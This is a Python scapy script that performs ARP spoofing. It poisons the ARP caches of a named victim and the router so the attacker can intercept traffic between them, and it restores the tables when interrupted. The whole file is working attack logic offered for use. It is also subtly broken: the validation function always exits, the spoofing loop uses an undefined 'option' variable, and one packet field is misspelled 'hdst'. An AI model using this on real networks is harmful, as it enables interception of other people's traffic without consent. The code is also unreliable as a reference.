import scapy.all as scapy
import time
import optparse
import sys

def get_arguments():
    parser = optparse.OptionParser()

    parser.add_option("-t", "--target", dest = "target", help = "IP Address of the victim/target")
    parser.add_option("-r", "--router", dest = "router", help = "IP Address of the router")

    (options, arguments) = parser.parse_args()

    if not options.target:
        parser.error("\n[-] Please specify a target IP Address. Use --help for more Information")
    elif not options.router:
        parser.error("\n[-] Please specify a router IP Address. Use --help for more Information")

    return options

def get_mac(target_ip):
    arp_request = scapy.ARP(pdst = target_ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0]
    
    try:
        return answered_list[0][1].hwsrc
    except IndexError:
        return None

def check_valid_target(target_ip, router_ip):
    if get_mac(target_ip) is None:
        print("[-] No devices found on the specified target IP Address")
    if get_mac(router_ip) is None:
        print("[-] No router found on the specified IP Address")

    sys.exit("Please enter valid arguments")

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst = target_ip, hdst = get_mac(target_ip), psrc = spoof_ip)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst = destination_ip, hwdst = get_mac(destination_ip), psrc = source_ip, hwsrc = get_mac(source_ip))
    scapy.send(packet, count=4, verbose = False)

options = get_arguments()
check_valid_target(options.target, options.router)

sent_packet_count = 0
try:
    while True:
        spoof(options.target, options.router)
        spoof(options.router, option.target)
        sent_packet_count = sent_packet_count + 2
        print("\rPackets Sent: " + str(sent_packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[-] CTRL + C detected, Restoring ARP Table")
    restore(options.target, options.router)
    restore(options.router, options.target)
    print("[+] ARP Table restored")
    print("Quiting....")




